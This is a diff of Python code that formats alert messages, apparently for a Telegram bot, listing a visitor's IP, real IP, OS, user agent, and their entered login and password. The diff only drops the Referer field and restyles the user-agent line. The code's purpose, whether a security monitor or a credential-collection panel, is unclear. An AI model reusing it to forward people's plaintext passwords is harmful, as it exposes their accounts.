@@ -83,13 +83,15 @@ def format_security_msg(title, info):
         mapping.append(('🔐 <b>Введеный пароль:</b>', info.get('password')))
         
     mapping.extend([
-        ('📲 <b>Referer:</b>', info.get('referer')),
         ('🌐 <b>UserAgent:</b>', info.get('ua')),
     ])
     
     for label, val in mapping:
         if val:
-            lines.append(f"{label} <code>{val}</code>")
+            if 'UserAgent:' in label:
+                lines.append(f"{label}\n<blockquote><code>{val}</code></blockquote>")
+            else:
+                lines.append(f"{label} <code>{val}</code>")
             
     if info.get('footer'):
         lines.append("")
@@ -154,7 +156,7 @@ def get_security_router():
                 
                 for line in lines:
 
-                    if any(x in line for x in ["iP:", "ОС и версия:", "Движок браузера:", "Метод запроса:", "UserAgent:", "Введеный логин:", "Введеный пароль:", "Referer:", "Реальный ip:"]):
+                    if any(x in line for x in ["iP:", "ОС и версия:", "Движок браузера:", "Метод запроса:", "UserAgent:", "Введеный логин:", "Введеный пароль:", "Реальный ip:"]):
 
                         if "iP:" in line: line = line.replace("iP:", "<b>iP:</b>").replace(line.split("iP:")[1], f" <code>{line.split('iP:')[1].strip()}</code>")
                         elif "ОС и версия:" in line: line = line.replace("ОС и версия:", "<b>ОС и версия:</b>").replace(line.split("ОС и версия:")[1], f" <code>{line.split('ОС и версия:')[1].strip()}</code>")
@@ -162,9 +164,10 @@ def get_security_router():
                         elif "Метод запроса:" in line: line = line.replace("Метод запроса:", "<b>Метод запроса:</b>").replace(line.split("Метод запроса:")[1], f" <code>{line.split('Метод запроса:')[1].strip()}</code>")
                         elif "Введеный логин:" in line: line = line.replace("Введеный логин:", "<b>Введеный логин:</b>").replace(line.split("Введеный логин:")[1], f" <code>{line.split('Введеный логин:')[1].strip()}</code>")
                         elif "Введеный пароль:" in line: line = line.replace("Введеный пароль:", "<b>Введеный пароль:</b>").replace(line.split("Введеный пароль:")[1], f" <code>{line.split('Введеный пароль:')[1].strip()}</code>")
-                        elif "Referer:" in line: line = line.replace("Referer:", "<b>Referer:</b>").replace(line.split("Referer:")[1], f" <code>{line.split('Referer:')[1].strip()}</code>")
                         elif "Реальный ip:" in line: line = line.replace("Реальный ip:", "<b>Реальный ip:</b>").replace(line.split("Реальный ip:")[1], f" <code>{line.split('Реальный ip:')[1].strip()}</code>")
-                        elif "UserAgent:" in line: line = line.replace("UserAgent:", "<b>UserAgent:</b>").replace(line.split("UserAgent:")[1], f" <code>{line.split('UserAgent:')[1].strip()}</code>")
+                        elif "UserAgent:" in line:
+                            ua_val = line.split("UserAgent:")[1].replace("<code>", "").replace("</code>", "").strip()
+                            line = f"<b>UserAgent:</b>\n<blockquote><code>{ua_val}</code></blockquote>"
                         
                         data_lines.append(line)
 
